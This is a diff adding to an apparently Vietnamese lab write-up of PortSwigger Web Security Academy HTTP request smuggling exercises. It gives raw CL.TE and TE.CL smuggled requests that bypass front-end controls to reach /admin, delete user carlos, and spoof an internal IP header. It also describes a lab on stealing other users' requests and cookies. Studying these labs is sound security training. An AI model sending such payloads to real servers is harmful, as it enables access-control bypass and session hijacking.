@@ -364,10 +364,226 @@ Bài lab cơ bản vẫn như những bài trước, tuy nhiên lần này chún
 
 
 
+```
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+X-Ignore: X
+```
+
+
+
+```
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 54
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+X-Ignore: X
+```
+
+
+
+```
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 139
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+```
 
 
 
 
+### Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
+```
+This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.
+
+To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
+```
+
+
+
+
+```
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-length: 4
+Transfer-Encoding: chunked
+
+60
+POST /admin HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+```
+
+
+
+```
+POST / HTTP/1.1
+Host: acee1f251ea07fc280fe56f700960090.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+71
+POST /admin HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+```
+
+
+
+
+```
+POST / HTTP/1.1
+Host: acee1f251ea07fc280fe56f700960090.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+71
+POST /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+```
+
+### Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting
+```
+This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
+
+There's an admin panel at /admin, but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the X-Forwarded-For header but has a different name.
+
+To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.
+
+```
+
+
+
+```
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 124
+Transfer-Encoding: chunked
+
+0
+
+POST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 200
+Connection: close
+
+search=aaa
+
+```
+
+
+=> X-vdAOdZ-Ip:
+
+
+```
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 143
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: close
+
+search=aaa
+```
+=> 127.0.0.1
+
+
+```
+
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 143
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+X-vdAOdZ-Ip: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: close
+
+search=aaa
+```
+
+
+
+
+```
+POST / HTTP/1.1
+Host: ac331f411e01f20480d95bff003c0025.web-security-academy.net
+Content-Length: 166
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+X-vdAOdZ-Ip: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: close
+
+x=1
+````
+
+
+
+
+
+
+### Lab: Exploiting HTTP request smuggling to capture other users' requests
+```
+This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
+
+To solve the lab, smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account.
+
+```
 
 
 
